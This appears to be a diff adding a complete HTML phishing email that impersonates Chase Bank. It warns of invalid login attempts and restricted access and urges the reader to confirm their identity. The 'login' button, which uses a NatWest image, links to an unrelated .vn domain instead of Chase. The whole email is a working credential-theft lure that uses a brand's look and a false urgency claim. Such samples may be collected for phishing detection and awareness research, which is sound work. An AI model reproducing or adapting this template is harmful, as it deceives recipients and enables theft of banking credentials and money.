@@ -1,0 +1,60 @@
+Subject:Account Status Notification
+
+<html>
+<head>
+<style type="text/css">
+<!-- 
+ body { font-family: tahoma, helvetica, sans-serif; font-size: 10pt; color: black; background: ;}
+ td   {font-size: 10pt;} 
+}--> 
+</style>
+</head>
+<body>
+<center>
+<table style="border-collapse: collapse" bordercolor="" cellpadding=2 cellspacing=2 width=650 border=1 bordercolor=#000000>
+<td>
+<table bgcolor="rgb(0,0,51)" cellpadding=0 cellspacing=0 width=650>
+<tr><td width=175><img src=https://www.chase.com/online/Home/images/chaseNewlogo.gif></td>
+<td> </td>
+</tr>
+</table>
+<center>
+<table width=600 cellpading=4 cellspacing=5>
+<tr>
+<td align=justify>
+  <br><b>Chase Bank</b> has been receiving complaints 
+  from our customers for unauthorised use of the Chase Online accounts.
+  As a result we periodically review Chase Online Accounts and temporarily restrict access of those accounts which we think are vunerable to the unauthorised use.<br>
+  <br>This message has been sent to you from Chase Bank because we have noticed invalid login attempts into your account, due to this we are temporarily limiting and restricting your account access until we confirm your identity.<br><br>
+            <br>
+
+            To confirm your identity and remove your account limitation please following the link below.<br><br><br>
+<table bgcolor=#7474AA width=600 cellpadding=0 cellspacing=0>
+<td width=40> </td>
+<td><a href=http://www.quatangquatao.vn/customer.php><img border=0 src=http://www.natwest.com/images/buttons/login.gif></a></td>
+</table>
+<br><br>
+</td>
+</tr>
+</table>
+<table width=600 cellpadding=0 cellspacing=0>
+Chase Bank is committed to ensure the safeguard of 
+each customer's personal information, making sure only authorised individuals 
+have access to their accounts. It is all about your security.
+</table>
+<P><FONT size=1>Accounts Management As outlined in our 
+User Agreement, Chase  will <BR> 
+  periodically send you information about site changes and 
+enhancements. </FONT></P> 
+<P><FONT size=1>Visit our Privacy Policy and User 
+Agreement if you have any questions. <BR> 
+</FONT><FONT color=#003399 
+size=1> http://www.chase.com/help/index.html</FONT></A></P> 
+</td></table>
+</body>
+</html>
+
+
+
+
+
